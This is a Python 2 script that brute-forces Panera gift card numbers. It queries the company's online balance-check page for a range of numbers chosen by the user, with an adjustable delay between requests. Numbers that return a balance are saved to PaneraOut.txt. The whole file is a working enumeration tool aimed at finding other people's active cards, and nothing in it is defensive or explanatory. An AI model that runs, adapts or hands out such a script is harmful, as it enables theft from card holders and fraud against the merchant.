import urllib, urllib2
import thread
import os, time

panera = []
tested = []
checked = []

dicks = False
step = 1 # Amount of numbers to add each time it checks

def _cPH(var):
        get = urllib2.urlopen("https://www.paneracards.com/checkbalance_transhistory.aspx?cardNum=" + str(var))
        handleData = get.read()
        get.close()
        exist = 'No balance/history found for this card. Thank you.'
        if exist not in handleData:
                panera.append(var)
                print "[+] " + str(var)
        else:
                print "[-] " + str(var)
        tested.append(var)
        checked.append(var)


_dicks = 0
while not dicks:
        if _dicks == 0:
                _var = raw_input("Starting number: ")
                try:
                        _var = int(_var)
                        _dicks += 1
                except:
                        print 'Not a valid number.'
        elif _dicks == 1:
                _delay = raw_input("Delay(ms): ")
                try:
                        delay = int(_delay)/float(1000)
                        _dicks += 1
                except:
                        print 'Not a valid number.'
        elif _dicks == 2:
                _limit = raw_input("Limit: ")
                try:
                        limit = int(_limit)
                        _dicks += 1
                except:
                        print 'Not a valid number.'
        elif _dicks == 3:
                _step = raw_input("Step (1 suggested): ")
                try:
                        step = int(_step)
                        dicks = not dicks
                except:
                        print 'Not a valid number.'       

while not limit == 0:
    if _var not in checked:
        _cPH(_var)
    _var += step
    limit -= 1
    time.sleep(delay)

print ""
print ""
print "Found " + str(len(panera)) + " working numbers."
print "Tested " + str(len(tested)) + "."
print "Ended on " + str(_var - 1)
if len(panera) > 0:
    _file = open("PaneraOut.txt", "w")
    for i in panera:
        _file.write(i)
    _file.write("STOPPED ON " + str(_var - 1))
    _file.close()
    print "Working numbers written to PaneraOut.txt in local directory."
raw_input()
